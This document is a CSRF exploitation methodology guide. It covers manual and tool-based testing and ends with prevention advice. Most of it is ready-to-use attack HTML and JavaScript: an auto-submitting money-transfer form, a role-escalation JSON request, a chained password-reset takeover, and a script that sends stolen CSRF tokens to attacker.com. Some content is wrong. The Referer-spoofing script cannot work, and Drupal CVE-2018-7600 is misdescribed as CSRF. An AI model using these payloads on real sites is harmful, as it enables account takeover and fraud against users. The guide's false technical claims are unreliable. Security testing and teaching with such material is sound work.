# Comprehensive CSRF Exploitation Methodology

## Understanding CSRF: The Core Concept

Cross-Site Request Forgery (CSRF) is a web security vulnerability that forces an authenticated user to execute unintended actions on a web application. The attack works because websites cannot distinguish between a legitimate request made by the user and a forged request created by an attacker .

### The Three Essential Conditions

For a CSRF attack to be successful, three conditions must be met :

1. **Valid User Session** - The victim must be actively logged into the target application
2. **Predictable Request** - The malicious request parameters must be known and controllable
3. **No Anti-CSRF Protection** - The application must lack proper CSRF tokens or other validation mechanisms

## Step-by-Step Testing Methodology

### Phase 1: Manual Discovery

Before using automated tools, manually identify potential CSRF vulnerabilities:

**Step 1: Map State-Changing Functions**
- Identify all actions that modify data: password changes, email updates, profile modifications, financial transactions
- Look for POST, PUT, DELETE, and PATCH requests
- Note any GET requests that modify state (these are especially dangerous)

**Step 2: Analyze Request Structure**
- Examine if a CSRF token is present in requests
- Check where the token appears (headers, POST body, URL parameters)
- Determine if token validation is tied to the user session

**Step 3: Test Basic Bypasses**
- Remove the token parameter entirely
- Submit a blank token value
- Replace the token with an invalid value (e.g., "1" or "aaaaaa")
- Change the HTTP method from POST to GET
- Use a token from a different session

### Phase 2: Automated Testing with Burp Suite

Burp Suite provides the most efficient workflow for CSRF testing :

**Capturing the Request:**

1. Configure Burp Suite as your proxy
2. Navigate to the target application and log in
3. Perform the state-changing action you want to test (e.g., update email)
4. In Burp Suite, go to Proxy → HTTP History
5. Locate the request (typically a POST request to an endpoint like `/my-account/change-email`)

**Generating the CSRF Proof of Concept:**

1. Right-click on the captured request
2. Navigate to `Engagement tools` → `Generate CSRF PoC`
3. Burp Suite automatically generates an HTML form that reproduces the request

**Understanding the Generated HTML:**

```html
<html>
  <body>
    <form action="https://target.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

The critical components include:
- The `action` attribute points to the vulnerable endpoint
- Hidden input fields contain the attack parameters
- The victim never sees what they are submitting 

**Testing the PoC:**

1. Click the `Test in browser` button in the PoC window
2. Copy the generated URL
3. Paste it into Burp's built-in browser (where you are still authenticated)
4. Submit the form and verify if the action was executed successfully

If the action completes successfully, the application is vulnerable to CSRF .

### Phase 3: Advanced Testing with Specialized Tools

**XSRFProbe** - A comprehensive CSRF audit toolkit :

```bash
# Basic scan
python3 xsrfprobe.py -u https://target.com/transfer -d "amount=1000&to=attacker"

# With cookie injection
xsrfprobe --url https://target.com --cookie "session=abc123"

# Generate attack payload
xsrfprobe --url https://target.com --generate-poc --output attack.html
```

XSRFProbe performs four layers of testing automatically :
1. Token removal testing
2. Referer header spoofing
3. Origin header manipulation
4. Token binding analysis

**CSRFTester** - Proxy-based testing tool:
- Runs as a local proxy (default port 8008)
- Captures all requests during browsing
- Allows modification and replay of captured requests
- Requires Java runtime environment 

**CSRFShark** - Browser extension for CSRF manipulation :
- Intercepts and modifies requests in real-time
- Automatically removes CSRF tokens from outgoing requests
- Generates exploit HTML on demand

## Real-World Exploitation Techniques

### Technique 1: HTML Form Auto-Submission

This is the most common CSRF attack vector, requiring no user interaction beyond visiting a malicious page:

```html
<html>
  <body>
    <form id="csrf-form" action="https://vulnerable-bank.com/transfer" method="POST">
      <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
      <input type="hidden" name="amount" value="10000">
      <input type="hidden" name="currency" value="USD">
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```

When a logged-in banking user visits this page, the form submits automatically, transferring money to the attacker's account .

### Technique 2: GET-Based CSRF via Image Tag

Some applications mistakenly use GET requests for state-changing operations:

```html
<img src="https://vulnerable.com/email/change?email=attacker@evil.com" style="display:none">
```

The browser automatically loads the image, sending the malicious request with the user's cookies .

### Technique 3: JSON CSRF with Content-Type Manipulation

Modern APIs often accept JSON, but may be vulnerable to CSRF when Content-Type headers are manipulated :

```html
<script>
  fetch('https://api.target.com/user/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"email":"attacker@evil.com","role":"admin"}'
  });
</script>
```

Some frameworks have inconsistent parsing of Content-Type headers, allowing JSON payloads to be processed even when sent with `text/plain` content type .

### Technique 4: Multi-Step CSRF Attacks

For complex applications requiring multiple requests, use chained attacks:

```html
<script>
  async function multiStepCSRF() {
    // Step 1: Initiate password reset
    await fetch('https://target.com/reset/initiate', {
      method: 'POST',
      credentials: 'include',
      body: 'email=victim@target.com'
    });
    
    // Step 2: Submit new password
    await fetch('https://target.com/reset/confirm', {
      method: 'POST',
      credentials: 'include',
      body: 'token=reset123&password=Hacked123!'
    });
  }
  multiStepCSRF();
</script>
```

Tools like `burp-multistep-csrf-poc` can automate generating these complex attack chains .

## Framework-Specific Testing Approaches

### Laravel

Laravel includes built-in CSRF protection via tokens in forms. Test by:
- Removing the `@csrf` directive from forms
- Checking if tokens are validated on API routes
- Testing if token expiration is properly enforced

Research indicates Laravel implements CSRF protection mechanisms, but misconfigurations can still leave vulnerabilities .

### Django

Django uses CSRF tokens with the `{% csrf_token %}` template tag. Test by:
- Submitting forms without the token
- Using the same token across multiple requests
- Testing if the `CsrfViewMiddleware` is disabled on specific views

Django's CSRF protection is robust when properly configured, but developers may disable it for API endpoints .

### Express.js (Node.js)

Express applications often use the `csurf` middleware. Test by:
- Removing the `_csrf` parameter from requests
- Testing if session-based token validation can be bypassed
- Checking for token reuse vulnerabilities

Express CSRF protection depends entirely on proper middleware implementation .

### Spring Framework

Spring Security provides CSRF protection enabled by default. Test by:
- Submitting requests without the `_csrf` token
- Testing if CSRF protection is disabled for specific paths
- Checking REST API endpoints that may have CSRF disabled

Spring's CSRF protection is effective when enabled, but commonly disabled for stateless APIs .

## Token Bypass Techniques

### Bypass 1: Token Removal

Some applications validate token presence but not correctness:

```http
POST /api/update HTTP/1.1
Host: target.com
Cookie: session=abc123

email=attacker@evil.com
```

If the server accepts this request without a token parameter, it's vulnerable .

### Bypass 2: Method Override

When tokens validate only POST requests:

```http
GET /api/update?email=attacker@evil.com HTTP/1.1
Host: target.com
Cookie: session=abc123
```

Or using the `_method` parameter:

```http
POST /api/update?_method=PUT HTTP/1.1
Host: target.com
Cookie: session=abc123

email=attacker@evil.com
```

### Bypass 3: Referer Header Manipulation

When validation checks if Referer contains the domain:

```html
<meta name="referrer" content="never">
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://target.com/action");
  xhr.setRequestHeader("Referer", "https://target.com");
  xhr.withCredentials = true;
  xhr.send("param=value");
</script>
```

### Bypass 4: CSRF Token Leak via HTML Injection

If the application has HTML injection anywhere:

```html
<!-- Steal token from response -->
<img src="https://attacker.com/steal?token=CSRF_TOKEN_VALUE">

<!-- Read token from DOM -->
<script>
  var token = document.querySelector('input[name="csrf_token"]').value;
  fetch('https://attacker.com/collect?t=' + encodeURIComponent(token));
</script>
```

## Real-World Historical Exploits

### Netflix CSRF (2006)

Attackers discovered that Netflix accepted GET requests for adding DVDs to queues. A simple image tag on any website would add DVDs to a logged-in user's queue:

```html
<img src="https://netflix.com/Queue/Add?movieid=12345">
```

### YouTube CSRF (2008)

YouTube's friend addition feature lacked CSRF protection, allowing attackers to add friends, send messages, and manipulate user relationships through hidden forms.

### ING Bank CSRF (2017)

The mobile banking interface had insufficient CSRF protection on fund transfers. Attackers created pages with hidden iframes that initiated transfers when visited by authenticated users.

### Drupal CVE-2018-7600

Drupal core had a CSRF vulnerability enabling remote code execution. Attackers chained CSRF with other weaknesses to achieve complete system compromise.

## Clickjacking: The CSRF Variant

Clickjacking (UI redress) is closely related to CSRF. A recent example is **CVE-2026-24839** affecting Dokploy versions prior to 0.26.6 .

**The Attack Vector:**
1. Attacker creates a malicious page with a transparent iframe containing the target application
2. The iframe is overlaid on deceptive UI elements
3. When the victim clicks what they think is a legitimate button, they actually click elements in the hidden iframe
4. Their authenticated session executes unintended actions

**Detection Methods for Clickjacking :**
- Check for missing `X-Frame-Options` header
- Verify absence of `Content-Security-Policy: frame-ancestors` directive
- Test if the application can be loaded in an iframe from an external domain

**Testing Code:**
```html
<iframe src="https://target.com/admin" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<div style="position:absolute; top:100px; left:100px;">
  <button>Click for Prize</button>
</div>
```

## Testing Checklist

Use this comprehensive checklist when testing for CSRF vulnerabilities:

**Discovery Phase:**
- [ ] Identify all state-changing endpoints (POST, PUT, DELETE, PATCH)
- [ ] Check for GET requests that modify data
- [ ] Note which requests use cookies for authentication

**Token Testing:**
- [ ] Remove token parameter entirely
- [ ] Submit blank token value
- [ ] Submit random token value
- [ ] Submit token from different user session
- [ ] Reuse previously valid token
- [ ] Test if token is validated on every request

**Method Testing:**
- [ ] Convert POST to GET with parameters in URL
- [ ] Add `_method=PUT` or `_method=DELETE` parameters
- [ ] Test different Content-Type headers

**Header Testing:**
- [ ] Remove Referer header
- [ ] Spoof Referer with valid domain
- [ ] Set Origin to null
- [ ] Test with missing Origin header

**Advanced Testing:**
- [ ] Check if tokens are predictable (timestamp, user ID hash)
- [ ] Verify token expiration time
- [ ] Test multi-step workflows
- [ ] Check API endpoints (especially JSON APIs)

## Tools Summary

| Tool | Purpose | Best For |
|------|---------|----------|
| Burp Suite | PoC generation, testing | Professional testing workflow |
| XSRFProbe | Automated scanning | Deep token analysis |
| CSRFTester | Proxy-based testing | Learning and education |
| CSRFShark | Browser extension | Quick testing during browsing |
| burp-multistep-csrf-poc | Complex attacks | Multi-step CSRF chains |

## Prevention Recommendations for Developers

To protect against CSRF attacks:

1. **Use Anti-CSRF Tokens** - Generate unique, unpredictable tokens for each session or request
2. **SameSite Cookies** - Set `SameSite=Lax` or `SameSite=Strict` on session cookies
3. **Custom Request Headers** - Require custom headers like `X-Requested-With` for API requests
4. **Referer Validation** - Validate the Referer header matches your domain
5. **Re-authentication** - Require password confirmation for sensitive actions
6. **Double-Submit Cookies** - Send CSRF token in both cookie and request header

The most effective protection combines multiple approaches: SameSite cookies, CSRF tokens, and re-authentication for critical operations.
